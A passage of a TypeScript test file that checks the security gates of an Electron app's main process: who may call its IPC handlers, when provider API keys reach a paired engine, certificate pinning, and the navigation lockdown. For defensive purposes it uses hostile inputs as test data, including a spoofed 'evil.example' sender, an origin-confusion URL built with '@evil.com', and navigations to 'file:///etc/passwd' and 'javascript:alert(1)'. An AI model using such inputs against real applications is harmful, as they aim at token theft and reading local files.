/**
 * The main process wiring: who is allowed to call the IPC handlers, what a
 * pairing is allowed to do on its own, and which certificate the app will
 * accept for a paired engine.
 *
 * These are the seams where the shell decides to hand something out — the
 * engine's bearer token, the user's provider keys, trust in a TLS certificate
 * — so every test here is about a refusal. `./engine` is the one module
 * replaced by a fake: it spawns a real process, and nothing below is about
 * process spawning. Everything else (the key store, the pairing store, the
 * HTTP client) runs for real against a tmp userData dir and a loopback server
 * standing in for the engine.
 */
import fs from "node:fs";
import http from "node:http";
import type { AddressInfo } from "node:net";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

/** Where the fake EngineManager will claim the local engine is listening.
 * Mutable so beforeEach can point it at this test's loopback server. */
const localEngine = vi.hoisted(() => ({ url: "http://127.0.0.1:1", token: "local-token" }));
/** The EngineManager main.ts constructed, plus a hook to make its teardown
 * slow — the quit path must wait for it rather than exiting first. */
const engineMock = vi.hoisted(() => ({
  instance: null as {
    stopped: number;
    waited: number;
    connection: { url: string; token: string } | null;
    crashListeners: ((crash: unknown) => void)[];
  } | null,
  teardown: null as Promise<void> | null,
}));

vi.mock("./engine", () => {
  class EngineConflictError extends Error {}
  class EngineManager {
    connection: { url: string; token: string } | null = null;
    stopped = 0;
    waited = 0;
    /** Kept so a test can fire a crash the way the real supervisor does. */
    crashListeners: ((crash: unknown) => void)[] = [];
    constructor() {
      engineMock.instance = this;
    }
    onCrash(listener: (crash: unknown) => void): void {
      this.crashListeners.push(listener);
    }
    async start(): Promise<{ url: string; token: string }> {
      this.connection = { ...localEngine };
      return this.connection;
    }
    stop(): void {
      this.stopped += 1;
      this.connection = null;
    }
    async stopAndWait(): Promise<void> {
      this.waited += 1;
      this.stop();
      // Stand in for an engine that outlives its SIGTERM.
      if (engineMock.teardown) await engineMock.teardown;
    }
  }
  return { EngineConflictError, EngineManager };
});

/* ------------------------------------------------------------- fixtures -- */

const DEV_ORIGIN = "http://127.0.0.1:5173";
const APP_URL = `${DEV_ORIGIN}/index.html`;

const PEM = (body: string): string =>
  `-----BEGIN CERTIFICATE-----\n${body}\n-----END CERTIFICATE-----\n`;
const ENGINE_CERT = PEM("QUJDREVGRw==");
const OTHER_CERT = PEM("WllYV1ZVVA==");

/** A pairing code the way the engine prints it. */
const codeFor = (payload: unknown): string =>
  Buffer.from(JSON.stringify(payload), "utf8").toString("base64url").replace(/=+$/, "");

interface EngineCall {
  method: string;
  url: string;
  authorization: string | undefined;
  body: string;
}

let dir: string;
let pairingFile: string;
let keysFile: string;
let engineServer: http.Server;
let engineUrl: string;
let engineCalls: EngineCall[];
/** Status for `/health`, which is unauthenticated and answered separately. */
let healthStatus: number;
/** Status for every authenticated route. */
let engineStatus: number;
/** A port nothing is listening on, for "the engine is unreachable" paths. */
let deadPort: number;

beforeEach(async () => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), "localcut-main-"));
  pairingFile = path.join(dir, "remote-engine.json");
  keysFile = path.join(dir, "provider-keys.json");
  engineCalls = [];
  engineMock.teardown = null;
  healthStatus = 200;
  engineStatus = 200;

  engineServer = http.createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on("data", (chunk: Buffer) => chunks.push(chunk));
    req.on("end", () => {
      engineCalls.push({
        method: req.method ?? "",
        url: req.url ?? "",
        authorization: req.headers.authorization,
        body: Buffer.concat(chunks).toString("utf8"),
      });
      res.writeHead(req.url === "/health" ? healthStatus : engineStatus, {
        "content-type": "application/json",
      });
      res.end("{}");
    });
  });
  await new Promise<void>((resolve) => engineServer.listen(0, "127.0.0.1", resolve));
  engineUrl = `http://127.0.0.1:${(engineServer.address() as AddressInfo).port}`;
  localEngine.url = engineUrl;

  const probe = http.createServer();
  await new Promise<void>((resolve) => probe.listen(0, "127.0.0.1", resolve));
  deadPort = (probe.address() as AddressInfo).port;
  await new Promise<void>((resolve) => probe.close(() => resolve()));

  vi.spyOn(console, "error").mockImplementation(() => {});
  vi.spyOn(console, "warn").mockImplementation(() => {});
  vi.spyOn(console, "log").mockImplementation(() => {});
});

afterEach(async () => {
  engineServer.closeAllConnections();
  await new Promise<void>((resolve) => engineServer.close(() => resolve()));
  fs.rmSync(dir, { recursive: true, force: true });
  delete process.env.VITE_DEV_SERVER_URL;
  delete process.env.LOCALCUT_UPDATE_FEED;
});

const settle = async (ready: () => boolean): Promise<void> => {
  for (let i = 0; i < 400 && !ready(); i += 1) {
    await new Promise((resolve) => setTimeout(resolve, 5));
  }
};

/**
 * Import main.ts fresh and let its whenReady body finish.
 *
 * `vi.resetModules()` gives every test its own module graph — main.ts keeps
 * connection state in module-level variables, and a second import against a
 * warm registry would inherit the previous test's pairing. It also means the
 * electron stub is a new instance each time, so it is returned rather than
 * imported at the top of the file.
 */
async function loadMain(
  options: {
    devUrl?: string;
    pairing?: unknown;
    keys?: Record<string, string>;
    lock?: boolean;
    /** Stands in for the release feed. Read at module scope, so it has to
     * be in the environment before main.ts is imported. */
    feed?: string;
    /** An installed build rather than `electron .`. Several startup choices
     * turn on this, so it has to be set before main.ts is imported. */
    packaged?: boolean;
    /** Give `app` a Dock, i.e. stand in for macOS. */
    dock?: boolean;
  } = {},
) {
  const lock = options.lock ?? true;
  vi.resetModules();
  const electron = await import("./test/electron-stub");
  electron.resetElectron();
  electron.state.userData = dir;
  electron.state.singleInstanceLock = lock;
  electron.state.isPackaged = options.packaged ?? false;
  electron.state.hasDock = options.dock ?? false;

  if (options.devUrl === undefined) delete process.env.VITE_DEV_SERVER_URL;
  else process.env.VITE_DEV_SERVER_URL = options.devUrl;
  // A developer who exported this for `npm run rig:e2e` and then ran the
  // tests in the same shell would otherwise send every store below at that
  // profile instead of this test's tmp dir. The override has its own tests.
  delete process.env.LOCALCUT_USERDATA;
  if (options.feed === undefined) delete process.env.LOCALCUT_UPDATE_FEED;
  else process.env.LOCALCUT_UPDATE_FEED = options.feed;
  if (options.pairing) fs.writeFileSync(pairingFile, JSON.stringify(options.pairing));
  if (options.keys) {
    // Written as `encrypted: false` so the blobs are plain base64 and this
    // fixture does not depend on the stub's seal format.
    const keys = Object.fromEntries(
      Object.entries(options.keys).map(([id, value]) => [
        id,
        Buffer.from(value, "utf8").toString("base64"),
      ]),
    );
    fs.writeFileSync(keysFile, JSON.stringify({ encrypted: false, keys }));
  }

  await import("./main");
  await new Promise((resolve) => setTimeout(resolve, 0));
  await settle(() => !lock || electron.BrowserWindow.instances.length > 0);

  const startupCalls = [...engineCalls];
  engineCalls.length = 0;
  return { electron, startupCalls };
}

/** An IPC event from the app's own top frame. */
const trusted = (url = APP_URL) => ({ senderFrame: { url, parent: null }, sender: {} });

/** The same, but with the sender of the window main actually created — the
 * handlers that show a dialog resolve it back through fromWebContents, and
 * a bare `{}` sender is indistinguishable there from a closed window.
 * Takes the stub instance because resetModules gives each test its own. */
const senderStub = (electron: { BrowserWindow: { instances: { webContents: unknown }[] } }) => ({
  senderFrame: { url: APP_URL, parent: null },
  sender: electron.BrowserWindow.instances[0]?.webContents,
});

/** Entry names read out of a zip's central directory, so an assertion about
 * a written bundle does not go through the code that wrote it. */
function zipNames(zip: Buffer): string[] {
  const eocd = zip.lastIndexOf(Buffer.from([0x50, 0x4b, 0x05, 0x06]));
  let cursor = zip.readUInt32LE(eocd + 16);
  const names: string[] = [];
  for (let index = 0; index < zip.readUInt16LE(eocd + 10); index += 1) {
    const nameLength = zip.readUInt16LE(cursor + 28);
    names.push(zip.subarray(cursor + 46, cursor + 46 + nameLength).toString("utf8"));
    cursor += 46 + nameLength + zip.readUInt16LE(cursor + 30) + zip.readUInt16LE(cursor + 32);
  }
  return names;
}

/** A loopback stand-in for the release feed. Real HTTP rather than a fetch
 * stub: the handler's job includes reading a status code and a body it did
 * not construct. */
async function feedServing(status: number, body: unknown) {
  const server = http.createServer((_req, res) => {
    res.writeHead(status, { "content-type": "application/json" });
    res.end(JSON.stringify(body));
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  return {
    url: `http://127.0.0.1:${(server.address() as AddressInfo).port}/latest`,
    close: () =>
      new Promise<void>((resolve) => {
        server.closeAllConnections();
        server.close(() => resolve());
      }),
  };
}

const storedPairing = (): Record<string, unknown> | null =>
  fs.existsSync(pairingFile) ? JSON.parse(fs.readFileSync(pairingFile, "utf8")) : null;

const keyPuts = (): EngineCall[] => engineCalls.filter((call) => call.url === "/providers/keys");

/* ----------------------------------------------------------- the tests -- */

describe("who may call the IPC handlers", () => {
  const gated: [string, unknown[]][] = [
    ["engine:inspect-pairing", ["code"]],
    ["engine:pair", ["code", {}]],
    ["engine:unpair", []],
    // Spawns a process. An injected frame that can ask for that can ask for
    // it repeatedly, whatever the banner on screen says.
    ["engine:restart", []],
    ["providers:arm-keys", []],
    // Opens a file-manager window. No secret leaves, but a page that can
    // make the shell act on the OS at all is a foothold.
    ["support:open-logs", []],
  ];

  it.each(gated)("%s refuses an untrusted sender", async (channel, args) => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    // inspect-pairing answers synchronously; the rest return promises. Both
    // survive an await, and the refusal has to look the same either way.
    const result = await electron.invokeIpc(channel, trusted("https://evil.example/"), ...args);
    expect(result).toEqual({ ok: false, error: "untrusted sender" });
  });

  it.each([
    ["providers:set-keys", { anthropic: "sk-ant" }],
    ["providers:clear-key", "anthropic"],
  ])("%s throws for an untrusted sender", async (channel, payload) => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    expect(() => electron.invokeIpc(channel, trusted("https://evil.example/"), payload)).toThrow(
      /untrusted sender/,
    );
  });

  it.each([
    // Both refuse in their own shape rather than the shared {ok,error} one,
    // so they cannot ride the table above. The side effects are a native
    // save dialog over the app and an outbound request — neither is
    // something an injected frame gets to start.
    ["support:export-bundle", { path: null, error: "untrusted sender" }],
    ["update:check", { latest: null, url: null, error: "untrusted sender" }],
  ])("%s refuses an untrusted sender", async (channel, expected) => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    expect(await electron.invokeIpc(channel, trusted("https://evil.example/"), {})).toEqual(
      expected,
    );
    expect(electron.saveDialogs).toEqual([]);
  });

  it("engine:connection reports the refusal instead of rejecting", async () => {
    // The renderer awaits this during startup with no catch, so a rejection
    // would strand the app on "Connecting…" forever with nothing shown.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    expect(electron.invokeIpc("engine:connection", trusted("https://evil.example/"))).toEqual({
      connection: null,
      error: "untrusted sender",
      remote: false,
      remotePaired: false,
      keysArmed: false,
    });
  });

  it("hands the engine token to the app's own top frame", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    expect(electron.invokeIpc("engine:connection", trusted())).toEqual({
      connection: { url: engineUrl, token: "local-token" },
      error: null,
      remote: false,
      remotePaired: false,
      // The local engine is this machine; the keys are already on it.
      keysArmed: true,
    });
  });

  it.each([
    ["an unarmed remote", false],
    ["an armed remote", true],
  ])("tells the renderer about %s", async (_label, armKeys) => {
    // Without this the renderer cannot tell the two apart, so it cannot offer
    // to arm one — which is how the arm-keys path came to be implemented on
    // both sides and reachable from neither.
    const { electron } = await loadMain({
      devUrl: DEV_ORIGIN,
      pairing: { url: engineUrl, token: "remote-token", armKeys },
    });
    expect(electron.invokeIpc("engine:connection", trusted())).toMatchObject({
      remote: true,
      keysArmed: armKeys,
    });
  });

  it("rejects a url that only looks like the app's origin", async () => {
    // WHATWG parses `http://127.0.0.1:5173@evil.com/` as host evil.com with
    // the dev URL as userinfo — a prefix compare accepts it, an origin
    // compare does not. Passing it means handing evil.com the engine token.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const result = electron.invokeIpc(
      "engine:connection",
      trusted(`${DEV_ORIGIN}@evil.com/index.html`),
    );
    expect(result).toMatchObject({ connection: null, error: "untrusted sender" });
  });

  it("rejects a subframe even when it is showing the app's own url", async () => {
    // Navigation lockdown does not cover an injected iframe; this does.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const subframe = { senderFrame: { url: APP_URL, parent: {} }, sender: {} };
    expect(electron.invokeIpc("engine:connection", subframe)).toMatchObject({
      error: "untrusted sender",
    });
  });

  it("rejects a frame that has already been disposed", async () => {
    // WebFrameMain property access throws once the frame is gone — a reload
    // racing an in-flight invoke. Untrusted is the safe answer.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const disposed = {
      get senderFrame(): never {
        throw new Error("frame disposed");
      },
      sender: {},
    };
    expect(electron.invokeIpc("engine:connection", disposed)).toMatchObject({
      error: "untrusted sender",
    });
  });
});

describe("provider key updates", () => {
  it("stores only the known providers, and only string values", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const result = (await electron.invokeIpc("providers:set-keys", trusted(), {
      anthropic: "sk-ant",
      openai: 5,
      gemini: null,
      bogus: "should not be stored",
    })) as { presence: Record<string, boolean> };

    expect(result.presence).toMatchObject({ anthropic: true, openai: false, gemini: false });
    expect(Object.keys(JSON.parse(fs.readFileSync(keysFile, "utf8")).keys)).toEqual(["anthropic"]);
  });

  it("arms the local engine with a newly entered key", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    await electron.invokeIpc("providers:set-keys", trusted(), { anthropic: "sk-ant" });

    expect(keyPuts()).toHaveLength(1);
    expect(keyPuts()[0]!.authorization).toBe("Bearer local-token");
    expect(JSON.parse(keyPuts()[0]!.body)).toEqual({ anthropic_key: "sk-ant" });
  });

  it("keeps the stored key when the engine rejects the push", async () => {
    // Persist first, then arm: a PUT failure is reported but never loses the
    // key, and startup re-arms it later.
    engineStatus = 500;
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const result = (await electron.invokeIpc("providers:set-keys", trusted(), {
      anthropic: "sk-ant",
    })) as { presence: Record<string, boolean>; error: string | null };

    expect(result.error).toMatch(/rejected provider keys: 500/);
    expect(result.presence.anthropic).toBe(true);
  });

  it("re-arms stored keys against the engine at startup", async () => {
    const { startupCalls } = await loadMain({ devUrl: DEV_ORIGIN, keys: { openai: "sk-oai" } });
    const put = startupCalls.find((call) => call.url === "/providers/keys");
    expect(put).toBeDefined();
    expect(JSON.parse(put!.body)).toEqual({ openai_key: "sk-oai" });
  });

  it("does not tell an untrusted caller which providers are configured", async () => {
    // Which BYOK providers are set up — and whether a real keychain backs
    // them — is reconnaissance, not public state. Reported rather than
    // thrown: the settings pane awaits this with no catch, and the all-false
    // shape is one it already renders.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, keys: { anthropic: "sk-ant" } });

    expect(electron.invokeIpc("providers:key-presence", trusted())).toMatchObject({
      anthropic: true,
    });
    expect(
      electron.invokeIpc("providers:key-presence", trusted("https://evil.example/")),
    ).toEqual({
      anthropic: false,
      openai: false,
      gemini: false,
      fal: false,
      encrypted: false,
    });
  });

  it("refuses an unknown provider id", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    expect(() => electron.invokeIpc("providers:clear-key", trusted(), "constructor")).toThrow(
      /unknown provider key id/,
    );
    expect(() => electron.invokeIpc("providers:clear-key", trusted(), 7)).toThrow(
      /unknown provider key id/,
    );
  });

  it("clears a key and tells the engine to drop it too", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, keys: { anthropic: "sk-ant" } });
    const result = (await electron.invokeIpc("providers:clear-key", trusted(), "anthropic")) as {
      presence: Record<string, boolean>;
    };

    expect(result.presence.anthropic).toBe(false);
    expect(JSON.parse(keyPuts()[0]!.body)).toEqual({ anthropic_key: "" });
  });
});

describe("inspecting a pairing code before accepting it", () => {
  it("decodes it without acting on it", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, keys: { anthropic: "sk-ant" } });
    engineCalls.length = 0;

    const fingerprint = "ab".repeat(32);
    const result = (await electron.invokeIpc(
      "engine:inspect-pairing",
      trusted(),
      codeFor({ url: "https://gpu.local:7830", token: "t", fingerprint }),
    )) as Record<string, unknown>;

    expect(result).toMatchObject({ ok: true, host: "gpu.local:7830", url: "https://gpu.local:7830" });
    // Grouped the way the engine prints it, so the two can be compared by eye.
    expect(result.fingerprint).toBe(new Array(32).fill("ab").join(":"));
    // Which keys this pairing would hand over — named, because "3 keys" is
    // not something anyone can reason about.
    expect(result.keys).toMatchObject({ anthropic: true, openai: false });
    // Nothing was contacted and nothing was stored.
    expect(engineCalls).toEqual([]);
    expect(storedPairing()).toBeNull();
  });

  it("reports why a bad code is bad", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    expect(
      electron.invokeIpc("engine:inspect-pairing", trusted(), codeFor({ url: "http://gpu.local" })),
    ).toMatchObject({ ok: false, error: expect.stringMatching(/must use https/) });
    expect(electron.invokeIpc("engine:inspect-pairing", trusted(), 42)).toMatchObject({
      ok: false,
      error: "pairing code must be text",
    });
  });
});

describe("pairing with a remote engine", () => {
  it("verifies the engine, then persists the pairing", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const result = await electron.invokeIpc(
      "engine:pair",
      trusted(),
      codeFor({ url: engineUrl, token: "remote-token" }),
      { armKeys: false },
    );

    expect(result).toEqual({ ok: true, error: null, keysArmed: false });
    expect(storedPairing()).toMatchObject({ url: engineUrl, token: "remote-token", armKeys: false });
    // Proved live and proved ours before being trusted.
    expect(engineCalls.map((call) => call.url)).toEqual(["/health", "/projects"]);
    expect(engineCalls[1]!.authorization).toBe("Bearer remote-token");
    expect(electron.invokeIpc("engine:connection", trusted())).toMatchObject({
      remote: true,
      remotePaired: true,
    });
  });

  it("does not send the provider keys unless the user said so", async () => {
    // Accepting a pairing code used to push every stored key to whatever host
    // the code named, and the certificate pin is no defence — the same code
    // supplies both the certificate and its fingerprint.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, keys: { anthropic: "sk-ant" } });
    engineCalls.length = 0;

    await electron.invokeIpc(
      "engine:pair",
      trusted(),
      codeFor({ url: engineUrl, token: "remote-token" }),
      { armKeys: false },
    );
    expect(keyPuts()).toEqual([]);
  });

  it("sends them when the user did", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, keys: { anthropic: "sk-ant" } });
    engineCalls.length = 0;

    const result = await electron.invokeIpc(
      "engine:pair",
      trusted(),
      codeFor({ url: engineUrl, token: "remote-token" }),
      { armKeys: true },
    );

    expect(result).toMatchObject({ keysArmed: true });
    expect(keyPuts()).toHaveLength(1);
    expect(keyPuts()[0]!.authorization).toBe("Bearer remote-token");
    expect(JSON.parse(keyPuts()[0]!.body)).toEqual({ anthropic_key: "sk-ant" });
  });

  it.each([
    ["the options are missing entirely", undefined],
    ["the options are not an object", "yes"],
    ["armKeys is merely truthy", { armKeys: "yes" }],
  ])("treats consent as withheld when %s", async (_label, options) => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, keys: { anthropic: "sk-ant" } });
    engineCalls.length = 0;

    const result = await electron.invokeIpc(
      "engine:pair",
      trusted(),
      codeFor({ url: engineUrl, token: "remote-token" }),
      options,
    );
    expect(result).toMatchObject({ ok: true, keysArmed: false });
    expect(keyPuts()).toEqual([]);
  });

  it("ignores an armKeys claim smuggled into the code itself", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, keys: { anthropic: "sk-ant" } });
    engineCalls.length = 0;

    await electron.invokeIpc(
      "engine:pair",
      trusted(),
      codeFor({ url: engineUrl, token: "remote-token", armKeys: true }),
      {},
    );
    expect(keyPuts()).toEqual([]);
    expect(storedPairing()).toMatchObject({ armKeys: false });
  });

  it("persists nothing when the engine cannot be reached", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, keys: { anthropic: "sk-ant" } });
    engineCalls.length = 0;

    const result = (await electron.invokeIpc(
      "engine:pair",
      trusted(),
      codeFor({ url: `http://127.0.0.1:${deadPort}`, token: "remote-token" }),
      { armKeys: true },
    )) as { ok: boolean; error: string };

    expect(result.ok).toBe(false);
    expect(result.error).toMatch(/unreachable/);
    expect(storedPairing()).toBeNull();
    expect(keyPuts()).toEqual([]);
  });

  it("refuses a pairing whose token the engine does not accept", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    engineStatus = 401;
    const result = (await electron.invokeIpc(
      "engine:pair",
      trusted(),
      codeFor({ url: engineUrl, token: "wrong-token" }),
      {},
    )) as { ok: boolean; error: string };

    expect(result.ok).toBe(false);
    expect(result.error).toMatch(/rejected the pairing token/);
    expect(storedPairing()).toBeNull();
  });

  it("refuses an engine that answers but is not healthy", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    healthStatus = 503;
    const result = (await electron.invokeIpc(
      "engine:pair",
      trusted(),
      codeFor({ url: engineUrl, token: "remote-token" }),
      {},
    )) as { ok: boolean; error: string };

    expect(result).toMatchObject({ ok: false, error: expect.stringMatching(/is not healthy/) });
    // The token is never offered to something that failed the health check.
    expect(engineCalls.map((call) => call.url)).toEqual(["/health"]);
    expect(storedPairing()).toBeNull();
  });
});

describe("arming keys as a separate decision", () => {
  it("records the agreement on the pairing so the next launch honours it", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, keys: { anthropic: "sk-ant" } });
    await electron.invokeIpc(
      "engine:pair",
      trusted(),
      codeFor({ url: engineUrl, token: "remote-token" }),
      { armKeys: false },
    );
    engineCalls.length = 0;

    await expect(electron.invokeIpc("providers:arm-keys", trusted())).resolves.toEqual({
      ok: true,
      error: null,
    });
    // Against this exact pairing — otherwise startup would ask again, or arm
    // anyway.
    expect(storedPairing()).toMatchObject({ armKeys: true });
    expect(JSON.parse(keyPuts()[0]!.body)).toEqual({ anthropic_key: "sk-ant" });
  });

  it("records nothing when the send is refused", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, keys: { anthropic: "sk-ant" } });
    await electron.invokeIpc(
      "engine:pair",
      trusted(),
      codeFor({ url: engineUrl, token: "remote-token" }),
      { armKeys: false },
    );
    engineStatus = 500;

    await expect(electron.invokeIpc("providers:arm-keys", trusted())).resolves.toMatchObject({
      ok: false,
    });
    // The user saw the refusal and believes nothing was sent. Consent left on
    // disk here would arm that host silently on the next launch, with the
    // pane still showing the engine as unarmed.
    expect(storedPairing()).toMatchObject({ armKeys: false });
  });

  it("skips the push when there is nothing stored", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    await electron.invokeIpc(
      "engine:pair",
      trusted(),
      codeFor({ url: engineUrl, token: "remote-token" }),
      {},
    );
    engineCalls.length = 0;

    await expect(electron.invokeIpc("providers:arm-keys", trusted())).resolves.toEqual({
      ok: true,
      error: null,
    });
    expect(keyPuts()).toEqual([]);
  });

  it("does not arm a remote the user never agreed to at startup", async () => {
    const { startupCalls } = await loadMain({
      devUrl: DEV_ORIGIN,
      keys: { anthropic: "sk-ant" },
      pairing: { url: engineUrl, token: "remote-token", armKeys: false },
    });
    // Declining at pair time has to survive the relaunch.
    expect(startupCalls.map((call) => call.url)).toEqual(["/health", "/projects"]);
  });

  it("does arm one the user did agree to", async () => {
    const { startupCalls } = await loadMain({
      devUrl: DEV_ORIGIN,
      keys: { anthropic: "sk-ant" },
      pairing: { url: engineUrl, token: "remote-token", armKeys: true },
    });
    expect(startupCalls.map((call) => call.url)).toContain("/providers/keys");
  });
});

describe("unpairing", () => {
  it("removes the pairing and falls back to the local engine", async () => {
    const { electron } = await loadMain({
      devUrl: DEV_ORIGIN,
      pairing: { url: engineUrl, token: "remote-token", armKeys: true },
    });
    expect(electron.invokeIpc("engine:connection", trusted())).toMatchObject({ remote: true });

    await expect(electron.invokeIpc("engine:unpair", trusted())).resolves.toEqual({
      ok: true,
      error: null,
    });
    expect(storedPairing()).toBeNull();
    expect(electron.invokeIpc("engine:connection", trusted())).toMatchObject({
      connection: { url: engineUrl, token: "local-token" },
      remote: false,
      remotePaired: false,
    });
  });

  it("leaves the pairing in place for an untrusted caller", async () => {
    const { electron } = await loadMain({
      devUrl: DEV_ORIGIN,
      pairing: { url: engineUrl, token: "remote-token" },
    });
    await electron.invokeIpc("engine:unpair", trusted("https://evil.example/"));
    expect(storedPairing()).not.toBeNull();
  });
});

describe("certificate pinning", () => {
  const pinned = () => ({
    url: `https://127.0.0.1:${deadPort}`,
    token: "remote-token",
    fingerprint: "a".repeat(64),
    cert: ENGINE_CERT,
  });

  it("trusts exactly the pinned certificate on the pinned host", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, pairing: pinned() });
    expect(
      electron.verifyCertificate({ hostname: "127.0.0.1", certificate: { data: ENGINE_CERT } }),
    ).toBe(0);
  });

  it("compares the certificate body, not its formatting", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, pairing: pinned() });
    const rewrapped = "-----BEGIN CERTIFICATE-----\r\n  QUJD REVGRw==  \r\n-----END CERTIFICATE-----";
    expect(
      electron.verifyCertificate({ hostname: "127.0.0.1", certificate: { data: rewrapped } }),
    ).toBe(0);
  });

  it.each([
    ["a different certificate", { hostname: "127.0.0.1", certificate: { data: OTHER_CERT } }],
    ["no certificate at all", { hostname: "127.0.0.1", certificate: undefined }],
  ])("rejects %s on the pinned host", async (_label, request) => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, pairing: pinned() });
    expect(electron.verifyCertificate(request)).toBe(-2);
  });

  it("leaves every other host to Chromium", async () => {
    // Pinning beyond the paired host would hard-fail unrelated https with no
    // fallback path.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, pairing: pinned() });
    expect(
      electron.verifyCertificate({ hostname: "example.com", certificate: { data: ENGINE_CERT } }),
    ).toBe(-3);
  });

  it("pins nothing when the pairing never captured a certificate", async () => {
    // parsePairingCode also accepts http for an SSH-forwarded remote, which
    // never captures one.
    const { electron } = await loadMain({
      devUrl: DEV_ORIGIN,
      pairing: { url: engineUrl, token: "remote-token" },
    });
    expect(
      electron.verifyCertificate({ hostname: "127.0.0.1", certificate: { data: ENGINE_CERT } }),
    ).toBe(-3);
  });

  it("applies the pin before anything has connected", async () => {
    // The verify proc is armed from the pairing on disk, so the very first
    // renderer request to the engine is already pinned.
    const { electron, startupCalls } = await loadMain({ devUrl: DEV_ORIGIN, pairing: pinned() });
    expect(startupCalls).toEqual([]); // the engine at deadPort never answered
    expect(
      electron.verifyCertificate({ hostname: "127.0.0.1", certificate: { data: ENGINE_CERT } }),
    ).toBe(0);
  });
});

describe("the certificate-error fallback", () => {
  const emitCertificateError = (
    electron: typeof import("./test/electron-stub"),
    url: string,
    data: string | undefined,
  ): boolean | undefined => {
    let verdict: boolean | undefined;
    electron.emitApp(
      "certificate-error",
      { preventDefault: () => {} },
      null,
      url,
      "ERR_CERT_AUTHORITY_INVALID",
      { data },
      (allowed: boolean) => (verdict = allowed),
    );
    return verdict;
  };

  const pinned = () => ({
    url: `https://127.0.0.1:${deadPort}`,
    token: "t",
    fingerprint: "a".repeat(64),
    cert: ENGINE_CERT,
  });

  it("accepts the pinned certificate on the paired authority", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, pairing: pinned() });
    expect(emitCertificateError(electron, `https://127.0.0.1:${deadPort}/health`, ENGINE_CERT)).toBe(
      true,
    );
  });

  it("matches a websocket url to the same authority", async () => {
    // wss://host:port and https://host:port are one engine; the renderer's
    // event stream must not be left unpinned.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, pairing: pinned() });
    expect(emitCertificateError(electron, `wss://127.0.0.1:${deadPort}/ws`, ENGINE_CERT)).toBe(true);
  });

  it.each([
    ["a different certificate", (port: number) => `https://127.0.0.1:${port}/health`, OTHER_CERT],
    ["a different port", (port: number) => `https://127.0.0.1:${port + 1}/health`, ENGINE_CERT],
    ["a different host", () => "https://evil.example/health", ENGINE_CERT],
    ["no certificate", (port: number) => `https://127.0.0.1:${port}/health`, undefined],
  ])("rejects %s", async (_label, urlFor, data) => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, pairing: pinned() });
    expect(emitCertificateError(electron, urlFor(deadPort), data)).toBe(false);
  });
});

describe("the window", () => {
  it("locks navigation to the app's own origin", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const window = electron.BrowserWindow.instances[0]!;

    expect(window.navigateTo(`${DEV_ORIGIN}/index.html`)).toBe(true);
    expect(window.navigateTo("https://evil.example/")).toBe(false);
    expect(window.navigateTo(`${DEV_ORIGIN}@evil.example/`)).toBe(false);
    expect(window.navigateTo("file:///etc/passwd")).toBe(false);
    expect(window.navigateTo("javascript:alert(1)")).toBe(false);
  });

  it("turns a navigation to the engine's origin into a download", async () => {
    // Download links (<a download href=…>) point at the engine, which is
    // cross-origin to the renderer — Chromium ignores the download attribute
    // there and navigates instead. The lockdown must not dead-end the click:
    // the engine's own URLs become downloads.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const window = electron.BrowserWindow.instances[0]!;
    const artifact = `${engineUrl}/projects/p1/artifacts/abc123?token=local-token`;

    expect(window.navigateTo(artifact)).toBe(false);
    expect(window.downloads).toEqual([artifact]);
  });

  it("does not download from non-engine origins it blocks", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const window = electron.BrowserWindow.instances[0]!;

    expect(window.navigateTo("https://evil.example/payload.bin")).toBe(false);
    expect(window.navigateTo(`${DEV_ORIGIN}@evil.example/payload.bin`)).toBe(false);
    expect(window.downloads).toEqual([]);
  });

  it("follows the active connection: a paired remote downloads, the idle local does not", async () => {
    // The local auto-spawn answers on a different origin than the remote the
    // user pairs; only the connection the renderer actually talks to may
    // trigger downloads.
    localEngine.url = `http://127.0.0.1:${deadPort}`;
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    await electron.invokeIpc(
      "engine:pair",
      trusted(),
      codeFor({ url: engineUrl, token: "remote-token" }),
      { armKeys: false },
    );
